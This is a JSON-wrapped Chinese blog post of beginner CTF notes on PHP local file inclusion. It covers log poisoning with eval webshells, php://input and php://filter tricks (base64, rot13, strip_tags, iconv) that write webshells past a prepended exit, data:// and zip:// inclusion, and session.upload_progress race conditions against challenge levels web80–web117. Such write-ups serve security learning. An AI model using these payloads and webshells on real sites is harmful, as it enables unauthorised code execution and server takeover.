{"title":"LFI","uid":"8b370a147ba28b5f9bf92d0ab1030d7d","slug":"LFI","date":"2024-10-23T13:05:28.000Z","updated":"2024-11-12T12:04:18.398Z","comments":true,"path":"api/articles/LFI.json","keywords":null,"cover":"/image/5.jpg","content":"<h1 id=\"文件包含相关函数\"><a href=\"#文件包含相关函数\" class=\"headerlink\" title=\"文件包含相关函数\"></a>文件包含相关函数</h1><h3 id=\"文件读取函数\"><a href=\"#文件读取函数\" class=\"headerlink\" title=\"文件读取函数\"></a>文件读取函数</h3><ol>\n<li><strong><code>fopen()</code></strong>: 打开一个文件或 URL，返回文件句柄。</li>\n<li><strong><code>fread()</code></strong>: 读取文件的指定字节数。</li>\n<li><strong><code>fgets()</code></strong>: 从文件指针中读取一行。</li>\n<li><strong><code>fgetcsv()</code></strong>: 从文件中读取一行并解析为 CSV 格式。</li>\n<li><strong><code>file_get_contents()</code></strong>: 将整个文件读入一个字符串。</li>\n<li><strong><code>file()</code></strong>: 将文件的每一行读入数组。</li>\n<li><strong><code>readfile()</code></strong>: 读取文件并直接输出。</li>\n<li><strong><code>SplFileObject::fread()</code></strong>: 从 <code>SplFileObject</code> 读取指定字节数。</li>\n<li><strong><code>SplFileObject::fgets()</code></strong>: 从 <code>SplFileObject</code> 读取一行。</li>\n<li><strong><code>fstat()</code></strong>: 获取文件的状态信息。</li>\n<li><strong><code>getimagesize()</code></strong>: 获取图像文件的尺寸。</li>\n</ol>\n<h3 id=\"文件写入函数\"><a href=\"#文件写入函数\" class=\"headerlink\" title=\"文件写入函数\"></a>文件写入函数</h3><ol>\n<li><strong><code>fwrite()</code></strong>: 向文件句柄写入数据。</li>\n<li><strong><code>fputs()</code></strong>: 向文件句柄写入字符串（等同于 <code>fwrite()</code>）。</li>\n<li><strong><code>file_put_contents()</code></strong>: 将字符串写入文件。</li>\n<li><strong><code>file_append_contents()</code></strong>: 追加字符串到文件（可以通过 <code>file_put_contents()</code> 的 <code>FILE_APPEND</code> 标志实现）。</li>\n<li><strong><code>ftruncate()</code></strong>: 截断文件到指定长度。</li>\n<li><strong><code>SplFileObject::fwrite()</code></strong>: 将数据写入 <code>SplFileObject</code>。</li>\n<li><strong><code>fopen()</code></strong>: 以写入模式打开文件。</li>\n</ol>\n<h3 id=\"文件删除和重命名函数\"><a href=\"#文件删除和重命名函数\" class=\"headerlink\" title=\"文件删除和重命名函数\"></a>文件删除和重命名函数</h3><ol>\n<li><strong><code>unlink()</code></strong>: 删除文件。</li>\n<li><strong><code>rename()</code></strong>: 重命名文件或目录。</li>\n</ol>\n<h3 id=\"目录操作函数\"><a href=\"#目录操作函数\" class=\"headerlink\" title=\"目录操作函数\"></a>目录操作函数</h3><ol>\n<li><strong><code>opendir()</code></strong>: 打开目录句柄。</li>\n<li><strong><code>readdir()</code></strong>: 读取目录中的文件名。</li>\n<li><strong><code>closedir()</code></strong>: 关闭目录句柄。</li>\n<li><strong><code>mkdir()</code></strong>: 创建目录。</li>\n<li><strong><code>rmdir()</code></strong>: 删除目录。</li>\n</ol>\n<h3 id=\"文件检查和状态函数\"><a href=\"#文件检查和状态函数\" class=\"headerlink\" title=\"文件检查和状态函数\"></a>文件检查和状态函数</h3><ol>\n<li><strong><code>file_exists()</code></strong>: 检查文件或目录是否存在。</li>\n<li><strong><code>is_file()</code></strong>: 检查路径是否为文件。</li>\n<li><strong><code>is_dir()</code></strong>: 检查路径是否为目录。</li>\n<li><strong><code>is_readable()</code></strong>: 检查文件是否可读。</li>\n<li><strong><code>is_writable()</code></strong>: 检查文件是否可写。</li>\n</ol>\n<h1 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h1><h2 id=\"敏感文件路径\"><a href=\"#敏感文件路径\" class=\"headerlink\" title=\"敏感文件路径\"></a>敏感文件路径</h2><h3 id=\"相对路径用法\"><a href=\"#相对路径用法\" class=\"headerlink\" title=\"相对路径用法\"></a>相对路径用法</h3><p> **..&#x2F;**表示返回上一个目录</p>\n<h3 id=\"绝对路径\"><a href=\"#绝对路径\" class=\"headerlink\" title=\"绝对路径\"></a>绝对路径</h3><p>示例</p>\n<p>D:\\phpstudy_pro\\WWW\\up\\upload\\web.php 要从最底部开始写</p>\n<ol>\n<li>后缀%00截断</li>\n<li>., .</li>\n<li>.空格. 绕过</li>\n</ol>\n<h2 id=\"默认日志文件路径\"><a href=\"#默认日志文件路径\" class=\"headerlink\" title=\"默认日志文件路径\"></a>默认日志文件路径</h2><p>在抓包在<strong>传参界面</strong>输入**<?php phpinfo();?><strong>或</strong><?php @eval($POST_[a]);?>**</p>\n<p><strong>再次访问日志文件</strong>来获取数据或连接菜刀 ps:连接前要清空缓存，<strong>经尝试发现，抓包时前不要有空格。</strong></p>\n<h2 id=\"php-filter协议\"><a href=\"#php-filter协议\" class=\"headerlink\" title=\"php_filter协议\"></a>php_filter协议</h2><p><code>php://filter/write=convert.base64-decode/resource=2.php</code>：这个封装协议将会把通过其写入的数据进行 Base64 解码，<strong>并将结果写入到</strong> <code>2.php</code> 文件中。</p>\n<p> <code>php://filter/read=convert.base64-decode/resource=2.php</code>：这个封装协议将会<strong>从 <code>2.php</code> 文件中读取数据</strong>，并对其进行 Base64 解码后返回给读取者。这种方式可以用来读取经过 Base64 编码的文件内容。</p>\n<p><code>php://filter/convert.base64-decode/resource=2.php</code>：这个封装协议与第二种方式类似，也是用来<strong>读取文件</strong>中经过 Base64 编码的数据并解码后返回给读取者，但是这种方式更加直接和简洁，不需要指定 <code>read</code>。</p>\n<h3 id=\"string字符串过滤器\"><a href=\"#string字符串过滤器\" class=\"headerlink\" title=\"string字符串过滤器\"></a>string字符串过滤器</h3><p>url&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;1.php</p>\n<ul>\n<li>string.rot13 — 对字符串执行 ROT13 转换.</li>\n<li>string.toupper— 将字符串转化为大写</li>\n<li>string.tolower— 将字符串转化为小写</li>\n</ul>\n<h3 id=\"convert\"><a href=\"#convert\" class=\"headerlink\" title=\"convert\"></a>convert</h3><p>payload eg: url&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;1.php</p>\n<p>convert.base64-encode</p>\n<ul>\n<li>UCS-4</li>\n<li>UCS-4BE</li>\n<li>UCS-4LE</li>\n<li>UCS-2</li>\n<li>UCS-2BE</li>\n<li>UCS-2LE</li>\n<li>UTF-32</li>\n<li>UTF-32BE</li>\n<li>UTF-32LE</li>\n<li>UTF-16</li>\n<li>UTF-16BE</li>\n<li>UTF-16LE</li>\n<li>UTF-7</li>\n<li>UTF7-IMAP</li>\n<li>UTF-8</li>\n<li>ASCII</li>\n</ul>\n<p><strong>php_input</strong></p>\n<p>命令执行及获取webshell（接收POST参数）</p>\n<p><strong>url&#x2F;?file&#x3D;php:&#x2F;&#x2F;input</strong> </p>\n<p>分析input内容会在POST中读取 post即可输入 </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">phpinfo</span>(); <span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;dir&quot;</span>)<span class=\"meta\">?&gt;</span> <span class=\"comment\">#查看当前网站目录下的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;shell.php&quot;</span>,<span class=\"string\">&quot;w&quot;</span>)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[a];?&gt;<span class=\"string\">&#x27;)?&gt;;</span></span><br></pre></td></tr></table></figure>\n\n<p>注意单双引号，正常都用双引号，并且有时要保证写入的文件shell.php不存在</p>\n<h2 id=\"zip压缩协议\"><a href=\"#zip压缩协议\" class=\"headerlink\" title=\"zip压缩协议\"></a>zip压缩协议</h2><p>zip:&#x2F;&#x2F;C:\\phpStudyB\\WWW\\lfi-labs-master\\php\\uploads\\6ae728ef2f40843a7e5695c0460ac354.    zip#backdoor.php <strong>#后即为压缩的文件</strong> </p>\n<p>在url输入时要把#换成%23，</p>\n<p>此协议不严格，<strong>jpg,txt文件都会当作压缩文件来处理</strong></p>\n<h2 id=\"php-data协议\"><a href=\"#php-data协议\" class=\"headerlink\" title=\"php-data协议\"></a>php-data协议</h2><p>接收GET参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?xxx=data://text/plain,&lt;?php phpinfo()?&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">url?xxx=data:text/plain,&lt;?php phpinfo()?&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">逗号后边写入的内容可以编码</span><br><span class=\"line\"></span><br><span class=\"line\">url?xxx=data:text/plain;base64,PD9waHAaCGhvaM5mb7cPz4=</span><br></pre></td></tr></table></figure>\n\n<p>例题</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$text</span>) &amp;&amp; <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^data:text\\/plain;base64,/&#x27;</span>, <span class=\"variable\">$text</span>)) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$decodedContent</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$text</span>, <span class=\"title function_ invoke__\">strlen</span>(<span class=\"string\">&#x27;data:text/plain;base64,&#x27;</span>)));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$decodedContent</span> === <span class=\"string\">&quot;welcome to the zjctf&quot;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;h1&gt;<span class=\"subst\">$decodedContent</span>&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>遇见这种形式就要用data协议</p>\n<h2 id=\"超过检验长度绕过\"><a href=\"#超过检验长度绕过\" class=\"headerlink\" title=\"超过检验长度绕过\"></a>超过检验长度绕过</h2><p>windows中一般GET POST检验长度为<strong>256</strong>个，linux检验长度是<strong>4096</strong>个</p>\n<p>url?(xxxx)&#x3D;web.php……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….</p>\n<h2 id=\"exit死亡绕过\"><a href=\"#exit死亡绕过\" class=\"headerlink\" title=\"exit死亡绕过\"></a>exit死亡绕过</h2><p> web87 </p>\n<p>参考文章</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>\n<h3 id=\"base64编码绕过\"><a href=\"#base64编码绕过\" class=\"headerlink\" title=\"base64编码绕过\"></a>base64编码绕过</h3><p>发现base64-encode后密文<strong>长度</strong>总是<strong>4的倍数</strong></p>\n<p><code>&lt;?php phpinfo();?&gt;</code> base64-encode是 <strong>PD9waHAgcGhwaW5mbygpOz8+</strong> <strong>长度是24</strong></p>\n<p>如上图会将**<?php exit;?><strong>拼接到</strong>$content**前</p>\n<p>可以使用</p>\n<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>\n<p><strong>来传入shell的内容 PD9waHAgcGhwaW5mbygpOz8+</strong></p>\n<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符</p>\n<p>但前边拼接的**<?php exit;?><strong>中的</strong>phpexit 7**个字母会传入到base64-decode中来解码</p>\n<p>这样一来<strong>shell内容</strong>就成了<strong>phpexitPD9waHAgcGhwaW5mbygpOz8+</strong></p>\n<p>但这这段密文长度为<strong>31，</strong>不是<strong>4的倍数</strong> 差一个字符<strong>凑成长度32</strong>即可</p>\n<p>即可将<strong>PD9waHAgcGhwaW5mbygpOz8+前加随意一个字母</strong></p>\n<p>构成 phpexit<strong>P****PD9waHAgcGhwaW5mbygpOz8+</strong> </p>\n<p>base64-decode后是 <strong>^+O<?php phpinfo();?></strong> exit函数被编码，成功绕过死亡exit</p>\n<p>l <strong>strip_tags过滤</strong></p>\n<p><code>strip_tags</code> 函数来去除字符串中的 HTML 标签</p>\n<p>eg:<strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input</strong></p>\n<p><strong>POST****传参 <?php exit;?>flag.php</strong></p>\n<p>读取到的是<strong>flag.php <?php exit;?>被去除</strong></p>\n<p><strong>再搭配base64-edcode传入shell内容</strong></p>\n<p><strong>php:&#x2F;&#x2F;filter&#x2F;strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell.php</strong></p>\n<p><strong>拼接后shell内容</strong> <?php exit;?><strong>PD9waHAgcGhwaW5mbygpOz8+</strong> </p>\n<p>l <strong>rot13编码绕过</strong></p>\n<p><strong>php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;shell.php</strong></p>\n<p>**<?php phpinfo();?>**经过rot13编码后这样：<code>**&lt;?cuc cucvasb();?&gt;**</code></p>\n<p>Shell内容为 <code>**&lt;?cuc cucvasb();?&gt;**</code></p>\n<p>拼接并加密后读取到的数据即为</p>\n<p><strong><?cuc rkvg;?><?php phpinfo();?></strong></p>\n<p><strong>使用条件</strong> PHP不开启short_open_tag</p>\n<h2 id=\"1-web80\"><a href=\"#1-web80\" class=\"headerlink\" title=\"1.web80\"></a>1.web80</h2><h3 id=\"日志包含\"><a href=\"#日志包含\" class=\"headerlink\" title=\"日志包含\"></a>日志包含</h3><p>在http包头构造命令执行代码</p>\n<p>Eg: <img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png\" alt=\"img\"></p>\n<p>file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>\n<p>POST: <strong>system(****’ls ‘);</strong></p>\n<h2 id=\"2-web82\"><a href=\"#2-web82\" class=\"headerlink\" title=\"2.web82\"></a>2.web82</h2><h3 id=\"利用-session-upload-progress-来进行文件包含\"><a href=\"#利用-session-upload-progress-来进行文件包含\" class=\"headerlink\" title=\"利用**session.upload_progress**来进行文件包含\"></a>利用<code>**session.upload_progress**</code>来进行<strong>文件包含</strong></h3><p><strong>参考文章</strong> <a href=\"https://www.cnblogs.com/r1kka/p/15848498.html\"><strong>https://www.cnblogs.com/r1kka/p/15848498.html</strong></a> </p>\n<p><img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png\" alt=\"img\"></p>\n<p><img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png\" alt=\"img\"></p>\n<p>简而言之，我们自定义的<strong>PHPSESSID</strong>(cookie的值)的值会变成<strong>文件名</strong>，比如定义<strong>PHPSESSID:rikka</strong>，文件名即为**&#x2F;tmp&#x2F;sess_rikka<strong>，而</strong>PHP_SESSION_UPLOAD_PROGRESS<strong>的值即为该文件的</strong>内容**</p>\n<p>任意文件上传 为了构造带有目标<strong>cookie值的报头</strong></p>\n<p>从而让<strong>服务器</strong>自动<strong>创建文件</strong></p>\n<p>上传任意文件后抓包 添加<strong>Cookie :PHPSESSID&#x3D;flag</strong> 在<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>下添加我们的执行代码</p>\n<p>再在目标网站访问 ?file&#x3D;<strong>&#x2F;tmp&#x2F;sess_flag</strong></p>\n<p><strong>开启两个攻击 一个一直上传 一个一直访问目标网站</strong></p>\n<p><img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png\" alt=\"img\"><img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png\" alt=\"img\"></p>\n<p>进行时时间竞争 得知文件名是fl0g.php</p>\n<p><img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image012.png\" alt=\"img\"></p>\n<p>更改命令内容<strong>再次时间竞争</strong> <strong>来获取flag</strong></p>\n<p><img src=\"file:///C:/Users/Sygsdsg/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png\" alt=\"img\"></p>\n<p>Web82-86 </p>\n<p>NB脚本</p>\n<h2 id=\"文件头-尾汇总\"><a href=\"#文件头-尾汇总\" class=\"headerlink\" title=\"文件头 尾汇总\"></a>文件头 尾汇总</h2><h3 id=\"web-116\"><a href=\"#web-116\" class=\"headerlink\" title=\"web 116\"></a>web 116</h3><p><img src=\"/post/LFI/image-20240423133843940.png\" alt=\"image-20240423133843940\"></p>\n<p> 用<strong>foermost分离文件</strong>，查看图片可看见<strong>文件包含利用源码</strong></p>\n<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>\n<p>burp抓包即可看见flag</p>\n<h2 id=\"filter伪协议iconv流数据\"><a href=\"#filter伪协议iconv流数据\" class=\"headerlink\" title=\"filter伪协议iconv流数据\"></a>filter伪协议iconv流数据</h2><h3 id=\"web117\"><a href=\"#web117\" class=\"headerlink\" title=\"web117\"></a>web117</h3><p>用法</p>\n<p>convert.iconv.<input-encoding>.<output-encoding><br>or<br>convert.iconv.<input-encoding>&#x2F;<output-encoding></output-encoding></input-encoding></output-encoding></input-encoding></p>\n<p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p>\n<p>UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*</p>\n<p>eg:利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p>\n<p><strong>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;2.php</strong></p>\n<p>web117</p>\n<p>payload:</p>\n<p>GET:file&#x3D;php:&#x2F;&#x2F;filter&#x2F;<strong>write&#x3D;convert.iconv.UCS-2LE.UCS-2BE</strong>&#x2F;resource&#x3D;a.php</p>\n<p>POST:contents&#x3D;<strong>?&lt;hp pvela”(_$OPTSa[“];)&gt;?</strong></p>\n<p>编码前 <?php eval(\"$_POST[a]\");?></p>\n<p>连接蚁剑即可</p>\n","text":"文件包含相关函数文件读取函数 fopen(): 打开一个文件或 URL，返回文件句柄。 fread(): 读取文件的指定字节数。 fgets(): 从文件指针中...","permalink":"/post/LFI","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":7,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">文件包含相关函数</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">文件读取函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">文件写入函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%92%8C%E9%87%8D%E5%91%BD%E5%90%8D%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">文件删除和重命名函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">目录操作函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E6%A3%80%E6%9F%A5%E5%92%8C%E7%8A%B6%E6%80%81%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">文件检查和状态函数</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84\"><span class=\"toc-text\">敏感文件路径</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">相对路径用法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84\"><span class=\"toc-text\">绝对路径</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%BB%98%E8%AE%A4%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84\"><span class=\"toc-text\">默认日志文件路径</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-filter%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">php_filter协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#string%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8\"><span class=\"toc-text\">string字符串过滤器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#convert\"><span class=\"toc-text\">convert</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#zip%E5%8E%8B%E7%BC%A9%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">zip压缩协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-data%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">php-data协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B6%85%E8%BF%87%E6%A3%80%E9%AA%8C%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">超过检验长度绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#exit%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">exit死亡绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">base64编码绕过</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-web80\"><span class=\"toc-text\">1.web80</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">日志包含</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-web82\"><span class=\"toc-text\">2.web82</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8-session-upload-progress-%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">利用**session.upload_progress**来进行文件包含</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%A4%B4-%E5%B0%BE%E6%B1%87%E6%80%BB\"><span class=\"toc-text\">文件头 尾汇总</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-116\"><span class=\"toc-text\">web 116</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#filter%E4%BC%AA%E5%8D%8F%E8%AE%AEiconv%E6%B5%81%E6%95%B0%E6%8D%AE\"><span class=\"toc-text\">filter伪协议iconv流数据</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web117\"><span class=\"toc-text\">web117</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"SSRF","uid":"41141451a0f1e1bb096d2164075e94d3","slug":"SSRF","date":"2024-10-24T06:13:31.000Z","updated":"2024-10-24T06:14:48.899Z","comments":true,"path":"api/articles/SSRF.json","keywords":null,"cover":"/image/2.jpg","text":"SSRF SSRF信息收集ssrf信息收集File伪协议 扫描内网主机查看内网地址 file:///etc/host 寻找内网其他主机 file:///proc...","permalink":"/post/SSRF","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"upload","uid":"6c4585b45b97f020140cf6fd5e44ee5e","slug":"upload","date":"2024-10-23T05:58:00.000Z","updated":"2024-10-23T11:01:59.680Z","comments":true,"path":"api/articles/upload.json","keywords":null,"cover":"/image/3.jpg","text":"文件上传判断漏洞形式 一句话木马 后缀 空格和点搭配 反复试 eg a.php. . 后缀 %00和0x00截断 %00需要PHP版本小于5.3.4 %00截断...","permalink":"/post/upload","photos":[],"count_time":{"symbolsCount":695,"symbolsTime":"1 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":7,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}